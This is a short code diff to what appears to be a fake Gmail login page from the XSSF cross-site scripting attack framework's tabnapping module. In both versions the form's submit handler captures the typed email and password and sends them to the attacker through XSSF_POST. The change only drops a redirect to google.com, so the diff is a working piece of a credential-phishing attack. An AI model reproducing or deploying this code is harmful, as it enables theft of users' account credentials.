@@ -171,7 +171,7 @@ function gaia_onLoginSubmit() {
 .gaia.captchahtml.cmt { font-family: arial, sans-serif; font-size: smaller; font-style: italic; }
   
 --></style>
-<form id="gaia_loginform" action="https://www.google.com/accounts/ServiceLoginAuth?service=mail" method="post" onsubmit="XSSF_POST('Gmail Account : ' + document.getElementById('Email').value + ' - ' + document.getElementById('Passwd').value, 'Tabnapping'); window.location.href='http://www.google.com'; return false;">
+<form id="gaia_loginform" action="https://www.google.com/accounts/ServiceLoginAuth?service=mail" method="post" onsubmit="XSSF_POST('Gmail Account : ' + document.getElementById('Email').value + ' - ' + document.getElementById('Passwd').value, 'Tabnapping'); return false;">
 <div id="gaia_loginbox">
 <table class="form-noindent" cellspacing="3" cellpadding="5" width="100%" border="0">
   <tr>
